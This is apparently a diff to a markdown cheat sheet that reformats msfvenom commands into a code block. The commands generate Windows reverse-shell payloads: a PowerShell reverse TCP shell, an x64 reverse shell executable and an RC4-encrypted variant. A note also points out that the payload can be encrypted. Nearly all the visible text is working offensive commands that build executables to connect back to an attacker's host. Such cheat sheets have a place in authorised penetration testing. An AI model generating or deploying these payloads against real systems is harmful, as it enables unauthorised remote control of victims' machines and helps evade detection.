@@ -12,9 +12,11 @@ $ msfvenom -p windows/powershell_reverse_tcp lhost=<IP> lport=<PORT> LOAD_MODULE
 
 ## 02 - x86-64 (64-bit) Payloads
 
-`$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -f exe -o shell-x64.exe`
+```
+$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -f exe -o shell-x64.exe
 
-`$ msfvenom -p windows/x64/shell_reverse_tcp_rc4 lhost=<IP> lport=<PORT> rc4password="<KEY>" -f exe -o shell-x64.exe`
+$ msfvenom -p windows/x64/shell_reverse_tcp_rc4 lhost=<IP> lport=<PORT> rc4password="<KEY>" -f exe -o shell-x64.exe
+```
 
 - You can encrypt the payload
 
